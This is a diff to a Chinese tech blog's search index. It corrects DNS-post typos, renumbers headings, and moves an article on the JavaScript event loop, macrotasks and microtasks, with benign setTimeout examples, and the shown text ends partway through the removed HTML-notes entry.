@@ -14,7 +14,7 @@
 <p><strong>根据《计算机网络》的定义：</strong>DNS是</p>
 <ol>
 <li><strong>一个由分层的 DNS 服务器实现的分布式数据库</strong></li>
-<li><strong>一个是的主机能够查询分布式数据库的应用层协议</strong></li>
+<li><strong>一个使得主机能够查询分布式数据库的应用层协议</strong></li>
 </ol>
 <h2 id="二、域名构成"><a href="#二、域名构成" class="headerlink" title="二、域名构成"></a>二、域名构成</h2><p><strong>域名是层次结构，从上到下（从书写上看是从右到左），分为根域名、顶级域名、二级域名、三级域名等等。</strong></p>
 <blockquote>
@@ -42,13 +42,13 @@
 </ol>
 </blockquote>
 <p>注意：在域名的每一个层级都有一个域名服务器，如果顶级域名中，有edu域名服务器，com域名服务器。</p>
-<p>从上面可以看出，DNS 系统是一个典型的树状结构，从根域名服务器开始一级一级的查询。跟服务器用于一切域名的起始解释权，通过下图可以大致了解解释权机制（SOA）。</p>
+<p>从上面可以看出，DNS 系统是一个典型的树状结构，从根域名服务器开始一级一级的查询。根服务器用于一切域名的起始解释权，通过下图可以大致了解解释权机制（SOA）。</p>
 <p><img src="/cover/dns.jpg" alt="DNS"></p>
 <h2 id="三、查询方式"><a href="#三、查询方式" class="headerlink" title="三、查询方式"></a>三、查询方式</h2><ul>
 <li>递归查询：A只请求B，直到B返回A想要的结果。</li>
 <li>迭代查询：A请求B，B返回结果告知A所需要请求的其他服务器，然后A再请求C、D、E等并拿到响应的返回结果。</li>
 </ul>
-<h2 id="域名缓存"><a href="#域名缓存" class="headerlink" title="域名缓存"></a>域名缓存</h2><ul>
+<h2 id="四、域名缓存"><a href="#四、域名缓存" class="headerlink" title="四、域名缓存"></a>四、域名缓存</h2><ul>
 <li><p>对于域名服务器而言：</p>
 <blockquote>
 <p>在首次进行解析域名时，会使用缓存保存域名和对应的IP地址映射。</p>
@@ -69,7 +69,7 @@
 </ul>
 </li>
 </ul>
-<h2 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h2><p>大致有七个步骤：</p>
+<h2 id="五、查询过程"><a href="#五、查询过程" class="headerlink" title="五、查询过程"></a>五、查询过程</h2><p>大致有七个步骤：</p>
 <ol>
 <li><p>首先搜索浏览器的DNS缓存，其缓存中维护了一张域名与IP地址的对应表，若有则返回，并结束操作</p>
 </li>
@@ -94,14 +94,92 @@
 <li>操作系统将得到的IP地址返回给浏览器，同时缓存该域名与IP的映射</li>
 <li>浏览器得到该域名对应的IP地址，同时缓存该域名与IP的映射</li>
 </ol>
-<h2 id="四、DNS-负载均衡基本原理"><a href="#四、DNS-负载均衡基本原理" class="headerlink" title="四、DNS 负载均衡基本原理"></a>四、DNS 负载均衡基本原理</h2><p>DNS 也用于在冗余的服务器之间进行负载分配。繁忙的站点被冗余分布在多台服务器上，每台服务器均运行在不同的端系统上，每个都有着不同的 IP 地址。</p>
-<p>DNS 服务器为同一个主机名/域名配置了多个 IP 地址，在应答 DNS 查询时，DNS 服务器对每个查询将以 DNS 文件中主机记录对应的 IP 地址按顺序返回不同的解析结果，将客户端访问引导到不同的机器上取，使得不同的客户端访问不同的服务器，从而达到负载均衡的目的。</p>
+<h2 id="六、DNS-负载均衡基本原理"><a href="#六、DNS-负载均衡基本原理" class="headerlink" title="六、DNS 负载均衡基本原理"></a>六、DNS 负载均衡基本原理</h2><p>DNS 也用于在冗余的服务器之间进行负载分配。繁忙的站点（例如cnn.com）被冗余分布在多台服务器上，每台服务器均运行在不同的端系统上，每个都有着不同的 IP 地址。</p>
+<p>DNS 服务器为同一个主机名/域名配置了多个 IP 地址，在应答 DNS 查询时，DNS 服务器对每个查询将以 DNS 文件中主机记录对应的 IP 地址按顺序返回不同的解析结果，将客户端访问引导到不同的机器上去，使得不同的客户端访问不同的服务器，从而达到负载均衡的目的。</p>
 ]]></content>
       <categories>
         <category>FrontEnd/前端</category>
       </categories>
       <tags>
         <tag>Network</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>事件循环 &amp; 微任务、宏任务</title>
+    <url>/2022/02/22/EventLoop/</url>
+    <content><![CDATA[<p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。理解事件循环的工作方式对于代码优化很重要，有时对于正确的架构也很重要。</p>
+<a id="more"></a>
+
+<h1 id="事件循环——微任务和宏任务"><a href="#事件循环——微任务和宏任务" class="headerlink" title="事件循环——微任务和宏任务"></a>事件循环——微任务和宏任务</h1><p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。</p>
+<h2 id="一、事件循环"><a href="#一、事件循环" class="headerlink" title="一、事件循环"></a>一、事件循环</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>事件循环是 JavaScript 引擎在等待任务、执行任务、以及进入休眠等待更多任务，这三个状态之间转换的无限循环。</p>
+<p><strong>引擎的一般流程（循环）：</strong></p>
+<blockquote>
+<ol>
+<li>设置任务</li>
+<li>引擎处理任务（如果有多个任务，则它们会组成一个队列即<strong>“宏任务队列”</strong>，按照先进先出的原则来处理任务即先进入的任务会被先执行）</li>
+<li>所有任务处理完成，引擎进入休眠等待新任务出现（休眠期间几乎不消耗任何CPU资源），然后转到第1步</li>
+</ol>
+</blockquote>
+<p><strong>注意：</strong></p>
+<ul>
+<li><strong>引擎执行任务时永远不会进行渲染（render）</strong>。即使任务执行需要很长时间，它也会等到任务完成之后才会绘制对 DOM 的更改。</li>
+<li>如果一项任务执行时间过长，则在该任务完成前，浏览器将无法执行后续其它任务。因此，在预设的某个时间段后，浏览器会抛出一个诸如“页面未响应”之类的警告，建议终止这个任务。（这种情况通常发生在有大量复杂计算或导致死循环的程序错误时）</li>
+</ul>
+<h2 id="二、拆分CPU过载任务"><a href="#二、拆分CPU过载任务" class="headerlink" title="二、拆分CPU过载任务"></a>二、拆分CPU过载任务</h2><p><strong>问题场景：</strong>如果 JS 引擎正在执行一个 CPU 过载的任务即该任务需要耗费大量的 CPU 资源和时间。那么在该任务完成前，引擎无法处理其它的DOM相关的任务，例如处理用户事件，这会表现为“网页卡顿很长一段时间，并且无法响应用户的其它交互行为”。这种情况是需要被避免的。</p>
+<p><strong>解决方法：</strong>这时，我们可以通过<strong>将大任务拆分为多个小任务</strong>来避免这个问题。每完成一个小任务，就使用<code>setTimeout</code>（延时参数设置为0）方法来再次安排一个小任务，直到所有小任务都被完成。</p>
+<p><strong>示例代码如下：</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 一个大任务</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">1e9</span>; j++) &#123;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
+<p>上面的代码块展示了一个耗时很长的大任务，该任务可能会使浏览器显示一个“脚本执行时间过长”的警告。</p>
+<p><strong>下面，我们使用<code>setTimeout</code>方法来拆分这个大任务：</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(count, <span class="number">0</span>); <span class="comment">// (**)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
+<p>现在，JS 引擎可以分批处理每个小任务，并且不影响后续其它任务的执行。原因在于：</p>
+<ol>
+<li>引擎首先执行（*）的小任务</li>
+<li>完成一个小任务后，如果该任务不是最后一个小任务，则调用<code>setTimeout</code>来安排一个新的小任务</li>
+<li>执行宏任务队列中的剩余任务，然后重复步骤一、二，直到所有小任务都完成。</li>
+</ol>
+<p>可见，关键在于**<code>setTimeout</code><strong>函数，</strong><code>setTimeout</code>会在时间到达时，为 JS 引擎安排一个回调函数事件，该事件会被插入到宏任务队列中**。在此之前，如果有其他事件发生，如用户点击事件，则会被先安排入宏任务队列，并按照先进先出的原则，优先执行，从而避免“脚本执行时间过长”、浏览器“挂起（hang）”的问题。</p>
+<p><strong>此外注意：</strong>多个嵌套的<code>setTimeout</code>调用在浏览器中的最小延迟为 4ms。因此即使我们设置了延迟为0，但还是至少需要 4ms的延迟。所以如果安排的越早，运行会越快，上述代码可以改写一下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; <span class="number">1e9</span> - <span class="number">1e6</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(count); <span class="comment">// 安排新的调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
+<h2 id="三、宏任务-amp-微任务"><a href="#三、宏任务-amp-微任务" class="headerlink" title="三、宏任务&amp;微任务"></a>三、宏任务&amp;微任务</h2><p>除了<strong>宏任务（macrotask）</strong>，还有<strong>微任务（microtask）</strong>。</p>
+<p><strong>微任务</strong>仅来自我们的代码：</p>
+<ol>
+<li>由 Promise 创建的 <strong>promise 对象的<code>.then/catch/finally</code>的处理程序</strong></li>
+<li><strong><code>await</code>的幕后</strong>（因此 await 是 promise 的另一种形式）</li>
+<li>**特殊函数<code>queueMicrotask(func)</code>**，它会对<code>func</code>进行排队，以在微任务队列中执行</li>
+</ol>
+<h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p><strong>每个宏任务之后，引擎会立即执行微任务队列中的所有微任务，然后再执行其他的宏任务或渲染或其它操作。</strong></p>
+<p>举例如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;3&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve()</span><br><span class="line">	.then(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;2&#x27;</span>));</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>对上述代码，引擎的执行顺序是：</p>
+<ol>
+<li>首先执行同步代码<code>alert(&#39;1&#39;)</code>，所以首先显示“1”</li>
+<li>然后执行 Promise 中的<code>then</code>中的回调函数，因为<code>then</code>是一个微任务，它会在微任务队列中，等一个宏任务执行结束后，会被立即执行，所以第二个显示的是“2”</li>
+<li>最后异步调用<code>setTimeout</code>中的回调函数会被从宏任务队列中取出执行，所以最后显示的是“3”</li>
+</ol>
+<p><strong>注：</strong>微任务会在执行任何其他操作（宏任务或渲染）前被完成，因此它<strong>确保了微任务之间的应用程序环境基本相同</strong>（即没有新的网络数据、没有DOM更改等）。</p>
+<h2 id="四、总结事件循环算法"><a href="#四、总结事件循环算法" class="headerlink" title="四、总结事件循环算法"></a>四、总结事件循环算法</h2><ol>
+<li><p><strong>宏任务队列</strong>遵循先进先出原则，首先取出并执行最早的任务</p>
+</li>
+<li><p><strong>执行微任务队列中所有的微任务</strong>：</p>
+<ul>
+<li>微任务队列也遵循先进先出原则，首先取出并执行最早的微任务</li>
+</ul>
+</li>
+<li><p><strong>渲染（如果DOM改变）</strong></p>
+</li>
+<li><p>重复前三个步骤</p>
+</li>
+<li><p>直到<strong>宏任务队列为空</strong>，则 JS 引擎<strong>休眠</strong>等待新任务</p>
+</li>
+</ol>
+<h2 id="五、安排新的宏任务"><a href="#五、安排新的宏任务" class="headerlink" title="五、安排新的宏任务"></a>五、安排新的宏任务</h2><p>可以使用零延迟的<code>setTimeout</code>。它同时还可以将大任务拆分为多个小任务，以便浏览器能够对用户事件作出反应。</p>
+]]></content>
+      <categories>
+        <category>FrontEnd/前端</category>
+      </categories>
+      <tags>
+        <tag>JavaScript</tag>
       </tags>
   </entry>
   <entry>
@@ -217,126 +295,6 @@
       </tags>
   </entry>
   <entry>
-    <title>事件循环 &amp; 微任务、宏任务</title>
-    <url>/2022/02/22/EventLoop/</url>
-    <content><![CDATA[<p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。理解事件循环的工作方式对于代码优化很重要，有时对于正确的架构也很重要。</p>
-<a id="more"></a>
-
-<h1 id="事件循环——微任务和宏任务"><a href="#事件循环——微任务和宏任务" class="headerlink" title="事件循环——微任务和宏任务"></a>事件循环——微任务和宏任务</h1><p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。</p>
-<h2 id="一、事件循环"><a href="#一、事件循环" class="headerlink" title="一、事件循环"></a>一、事件循环</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>事件循环是 JavaScript 引擎在等待任务、执行任务、以及进入休眠等待更多任务，这三个状态之间转换的无限循环。</p>
-<p><strong>引擎的一般流程（循环）：</strong></p>
-<blockquote>
-<ol>
-<li>设置任务</li>
-<li>引擎处理任务（如果有多个任务，则它们会组成一个队列即<strong>“宏任务队列”</strong>，按照先进先出的原则来处理任务即先进入的任务会被先执行）</li>
-<li>所有任务处理完成，引擎进入休眠等待新任务出现（休眠期间几乎不消耗任何CPU资源），然后转到第1步</li>
-</ol>
-</blockquote>
-<p><strong>注意：</strong></p>
-<ul>
-<li><strong>引擎执行任务时永远不会进行渲染（render）</strong>。即使任务执行需要很长时间，它也会等到任务完成之后才会绘制对 DOM 的更改。</li>
-<li>如果一项任务执行时间过长，则在该任务完成前，浏览器将无法执行后续其它任务。因此，在预设的某个时间段后，浏览器会抛出一个诸如“页面未响应”之类的警告，建议终止这个任务。（这种情况通常发生在有大量复杂计算或导致死循环的程序错误时）</li>
-</ul>
-<h2 id="二、拆分CPU过载任务"><a href="#二、拆分CPU过载任务" class="headerlink" title="二、拆分CPU过载任务"></a>二、拆分CPU过载任务</h2><p><strong>问题场景：</strong>如果 JS 引擎正在执行一个 CPU 过载的任务即该任务需要耗费大量的 CPU 资源和时间。那么在该任务完成前，引擎无法处理其它的DOM相关的任务，例如处理用户事件，这会表现为“网页卡顿很长一段时间，并且无法响应用户的其它交互行为”。这种情况是需要被避免的。</p>
-<p><strong>解决方法：</strong>这时，我们可以通过<strong>将大任务拆分为多个小任务</strong>来避免这个问题。每完成一个小任务，就使用<code>setTimeout</code>（延时参数设置为0）方法来再次安排一个小任务，直到所有小任务都被完成。</p>
-<p><strong>示例代码如下：</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 一个大任务</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">1e9</span>; j++) &#123;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
-<p>上面的代码块展示了一个耗时很长的大任务，该任务可能会使浏览器显示一个“脚本执行时间过长”的警告。</p>
-<p><strong>下面，我们使用<code>setTimeout</code>方法来拆分这个大任务：</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(count, <span class="number">0</span>); <span class="comment">// (**)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
-<p>现在，JS 引擎可以分批处理每个小任务，并且不影响后续其它任务的执行。原因在于：</p>
-<ol>
-<li>引擎首先执行（*）的小任务</li>
-<li>完成一个小任务后，如果该任务不是最后一个小任务，则调用<code>setTimeout</code>来安排一个新的小任务</li>
-<li>执行宏任务队列中的剩余任务，然后重复步骤一、二，直到所有小任务都完成。</li>
-</ol>
-<p>可见，关键在于**<code>setTimeout</code><strong>函数，</strong><code>setTimeout</code>会在时间到达时，为 JS 引擎安排一个回调函数事件，该事件会被插入到宏任务队列中**。在此之前，如果有其他事件发生，如用户点击事件，则会被先安排入宏任务队列，并按照先进先出的原则，优先执行，从而避免“脚本执行时间过长”、浏览器“挂起（hang）”的问题。</p>
-<p><strong>此外注意：</strong>多个嵌套的<code>setTimeout</code>调用在浏览器中的最小延迟为 4ms。因此即使我们设置了延迟为0，但还是至少需要 4ms的延迟。所以如果安排的越早，运行会越快，上述代码可以改写一下：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; <span class="number">1e9</span> - <span class="number">1e6</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(count); <span class="comment">// 安排新的调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
-<h2 id="三、宏任务-amp-微任务"><a href="#三、宏任务-amp-微任务" class="headerlink" title="三、宏任务&amp;微任务"></a>三、宏任务&amp;微任务</h2><p>除了<strong>宏任务（macrotask）</strong>，还有<strong>微任务（microtask）</strong>。</p>
-<p><strong>微任务</strong>仅来自我们的代码：</p>
-<ol>
-<li>由 Promise 创建的 <strong>promise 对象的<code>.then/catch/finally</code>的处理程序</strong></li>
-<li><strong><code>await</code>的幕后</strong>（因此 await 是 promise 的另一种形式）</li>
-<li>**特殊函数<code>queueMicrotask(func)</code>**，它会对<code>func</code>进行排队，以在微任务队列中执行</li>
-</ol>
-<h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p><strong>每个宏任务之后，引擎会立即执行微任务队列中的所有微任务，然后再执行其他的宏任务或渲染或其它操作。</strong></p>
-<p>举例如下：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;3&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve()</span><br><span class="line">	.then(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;2&#x27;</span>));</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>对上述代码，引擎的执行顺序是：</p>
-<ol>
-<li>首先执行同步代码<code>alert(&#39;1&#39;)</code>，所以首先显示“1”</li>
-<li>然后执行 Promise 中的<code>then</code>中的回调函数，因为<code>then</code>是一个微任务，它会在微任务队列中，等一个宏任务执行结束后，会被立即执行，所以第二个显示的是“2”</li>
-<li>最后异步调用<code>setTimeout</code>中的回调函数会被从宏任务队列中取出执行，所以最后显示的是“3”</li>
-</ol>
-<p><strong>注：</strong>微任务会在执行任何其他操作（宏任务或渲染）前被完成，因此它<strong>确保了微任务之间的应用程序环境基本相同</strong>（即没有新的网络数据、没有DOM更改等）。</p>
-<h2 id="四、总结事件循环算法"><a href="#四、总结事件循环算法" class="headerlink" title="四、总结事件循环算法"></a>四、总结事件循环算法</h2><ol>
-<li><p><strong>宏任务队列</strong>遵循先进先出原则，首先取出并执行最早的任务</p>
-</li>
-<li><p><strong>执行微任务队列中所有的微任务</strong>：</p>
-<ul>
-<li>微任务队列也遵循先进先出原则，首先取出并执行最早的微任务</li>
-</ul>
-</li>
-<li><p><strong>渲染（如果DOM改变）</strong></p>
-</li>
-<li><p>重复前三个步骤</p>
-</li>
-<li><p>直到<strong>宏任务队列为空</strong>，则 JS 引擎<strong>休眠</strong>等待新任务</p>
-</li>
-</ol>
-<h2 id="五、安排新的宏任务"><a href="#五、安排新的宏任务" class="headerlink" title="五、安排新的宏任务"></a>五、安排新的宏任务</h2><p>可以使用零延迟的<code>setTimeout</code>。它同时还可以将大任务拆分为多个小任务，以便浏览器能够对用户事件作出反应。</p>
-]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>JavaScript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML基础---学习手记</title>
-    <url>/2021/09/22/HTMLNotes/</url>
-    <content><![CDATA[<p><strong>关于HTML一些生疏和不常见的知识，简单汇总一下。</strong></p>
-<a id="more"></a>
-
-<h2 id="HTML布局元素"><a href="#HTML布局元素" class="headerlink" title="HTML布局元素"></a>HTML布局元素</h2><blockquote>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="../pic/Layout.jpg" alt="Layout"></p>
-</blockquote>
-<h2 id="多媒体嵌入"><a href="#多媒体嵌入" class="headerlink" title="多媒体嵌入"></a>多媒体嵌入</h2><h3 id="图片—img"><a href="#图片—img" class="headerlink" title="图片—img"></a>图片—img</h3><p> 为图片提供一个语义容器，在标题和图片之间建立清晰的关联，使用HTML5 的<figure>和<figcaption>元素。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;当图片无法显示时&quot;</span> <span class="attr">title</span>=<span class="string">&quot;当鼠标悬浮在图片时说明图片&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>说明图片的描述文字<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="视频和音频—video-amp-audio"><a href="#视频和音频—video-amp-audio" class="headerlink" title="视频和音频—video&amp;audio"></a>视频和音频—video&amp;audio</h2><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;视频资源地址&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    不支持视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><em>controls</em> 显示浏览器提供的控件界面</p>
-<h4 id="使用多个播放源以提高兼容性"><a href="#使用多个播放源以提高兼容性" class="headerlink" title="使用多个播放源以提高兼容性"></a>使用多个播放源以提高兼容性</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    浏览器不支持该视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p> WebM 和 MP4 两种格式在目前已经足够支持大多数平台和浏览器。</p>
-<h4 id="其他video特性—H5"><a href="#其他video特性—H5" class="headerlink" title="其他video特性—H5"></a>其他video特性—H5</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span></span></span><br><span class="line"><span class="tag">       <span class="attr">poster</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 